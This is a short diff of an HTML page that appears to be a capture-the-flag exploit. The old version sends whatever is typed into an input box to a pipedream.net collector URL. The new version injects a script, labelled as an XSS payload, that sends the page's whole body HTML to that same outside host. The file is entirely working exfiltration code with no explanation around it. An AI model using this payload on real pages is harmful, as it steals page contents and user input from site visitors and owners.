@@ -1,14 +1,16 @@
+<!DOCTYPE html>
 <html>
+<head>
   <title id="getFlag">HI</title>
-  <body>
-    <p>flag</p>
-    <input type="text" id="flagInput">
-  </body>
-  <script>
-    const flagInput = document.getElementById("flagInput");
-    flagInput.addEventListener("input", () => {
-      const flagValue = flagInput.value;
-      fetch("https://eoue93psy15d0ln.m.pipedream.net?" + flagValue);
-    });
-  </script>
+</head>
+<body>
+  <p>flag</p>
+</body>
+<script>
+  document.getElementById("getFlag").innerHTML = 'Payload executed';
+  var scriptElement = document.createElement('script');
+  var xssPayload = 'fetch("https://eoue93psy15d0ln.m.pipedream.net?" + document.body.innerHTML)';
+  scriptElement.textContent = xssPayload;
+  document.body.appendChild(scriptElement);
+</script>
 </html>
